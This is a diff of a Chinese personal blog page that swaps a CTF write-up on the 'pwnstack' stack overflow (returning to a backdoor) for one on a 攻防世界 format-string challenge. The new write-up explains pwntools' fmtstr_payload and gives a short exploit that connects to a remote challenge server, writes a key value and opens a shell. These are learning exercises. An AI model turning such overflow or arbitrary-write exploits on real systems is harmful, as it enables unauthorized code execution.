@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="浅尝pwn题：pwnstack, 矢坕个人博客">
+    <meta name="keywords" content="攻防世界——实时数据监测, 矢坕个人博客">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>浅尝pwn题：pwnstack | 矢坕个人博客</title>
+    <title>攻防世界——实时数据监测 | 矢坕个人博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">浅尝pwn题：pwnstack</h1>
+                    <h1 class="description center-align post-title">攻防世界——实时数据监测</h1>
                 </div>
             </div>
         </div>
@@ -447,21 +447,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-12-24
+                    2023-01-10
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-01-08
+                    2023-01-10
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    273
+                    261
                 </div>
                 
 
@@ -486,13 +486,16 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="pwnstack-wp"><a href="#pwnstack-wp" class="headerlink" title="pwnstack wp"></a>pwnstack wp</h2><p>这题pwn是我看wp写出来的，一个晚上的琢磨感觉网上的wp还是不够简洁，于是乎我自己来总结一下：<br>首先从网站上下载压缩包解压后放至自己虚拟机的文件夹中；<br>发现它是个64位二进制文件：<br><img src="/images/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/1.png"><br>对其进行checksec下如下图：<br><img src="/images/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/2.png"><br>发现只有NX保护打开。<br>在物理机上将它拖进IDA中分析：<br><img src="/images/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/3.png"><br>对其中的函数双击点进去，发现vul函数中有read函数可读取177个字节，而我们定义的buf只有160个字节，很明显是个栈溢出题目。<br><img src="/images/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/4.png"><br>然后我们在这列中找到了后门函数：backdoor<br><img src="/images/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/5.png"><br>进去看发现它可以直接调用&#x2F;bin&#x2F;sh获得shell：<br><img src="/images/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/6.png"><br>接下来就是编写脚本了，因为要覆盖到返回地址只要将buf区填满和rbp指针覆盖共需要168个字节于是我们填充168个a，后面返回地址则覆盖为backdoor的地址即可</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span> 
-io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn2'</span><span class="token punctuation">)</span>
-payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">168</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x400762</span><span class="token punctuation">)</span>
+                <h1 id="攻防世界——实时数据监测"><a href="#攻防世界——实时数据监测" class="headerlink" title="攻防世界——实时数据监测"></a>攻防世界——实时数据监测</h1><p>这题思路很简单，难度大大降低了，本来是一道盲打题，但给了文件就很清晰了，主要是记录一下一个pwntools的新用法<br>checksec：<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%E7%9B%91%E6%B5%8B/1.png"><br>看到没开任何保护，经验就告诉我，这是一道盲打改编题。<br>拖进IDA：<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%E7%9B%91%E6%B5%8B/2.png"><br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%E7%9B%91%E6%B5%8B/3.png"><br>逻辑很简单知道吧key赋值成0x2223322就可以获得shell<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%E7%9B%91%E6%B5%8B/4.png"><br>这里也很清楚是个格式化字符串漏洞<br>连接靶机看看偏移量：<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%E7%9B%91%E6%B5%8B/6.png"><br>偏移量为12<br>这里讲一讲要用到的pwntools：fmtstr_payload(offset, writes, numbwritten&#x3D;0, write_size&#x3D;’byte’)<br>实际上我们常用的形式是<strong>fmtstr_payload(offset, {printf_got: system_addr})(偏移，{原地址：目的地址})</strong><br>比如我要更改puts函数got表中的实际地址为system的实际地址，且偏移量为12，我可以这么写：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">fmtstr_payload<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>puts_got<span class="token punctuation">:</span>system_addr<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment">#这里是变量名</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>这样就可以实现真正的<strong>任意内存地址写</strong><br>上exp：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
+io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span><span class="token number">58121</span><span class="token punctuation">)</span>
+payload<span class="token operator">=</span>fmtstr_payload<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token number">0x804A048</span><span class="token punctuation">:</span><span class="token number">0x2223322</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
 io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>获取shell</p>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>获得shell：<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%E7%9B%91%E6%B5%8B/5.png"></p>
 
                 
             </div>
@@ -519,7 +522,7 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://airunfive.github.io/2022/12/24/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/">http://airunfive.github.io/2022/12/24/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/</a>
+                    <a href="http://airunfive.github.io/2023/01/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%E7%9B%91%E6%B5%8B/">http://airunfive.github.io/2023/01/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%E7%9B%91%E6%B5%8B/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -728,17 +731,18 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/12/25/hello-pwn/">
+                <a href="/2023/01/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%E7%9B%91%E6%B5%8B/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="hello_pwn">
+                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="攻防世界——实时数据监测">
                         
-                        <span class="card-title">hello_pwn</span>
+                        <span class="card-title">攻防世界——实时数据监测</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -748,9 +752,9 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-12-25
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-01-10
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -759,6 +763,7 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -777,13 +782,13 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/12/24/pwntools%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/">
+                <a href="/2023/01/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn1%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="pwntools的基本语法">
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="攻防世界pwn1细节分析">
                         
-                        <span class="card-title">pwntools的基本语法</span>
+                        <span class="card-title">攻防世界pwn1细节分析</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -794,7 +799,7 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-12-24
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-01-08
                             </span>
                         <span class="publish-author">
                             
@@ -807,8 +812,8 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/pwn%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">
-                        <span class="chip bg-color">pwn工具使用</span>
+                    <a href="/tags/pwn-write-up/">
+                        <span class="chip bg-color">pwn-write-up</span>
                     </a>
                     
                 </div>
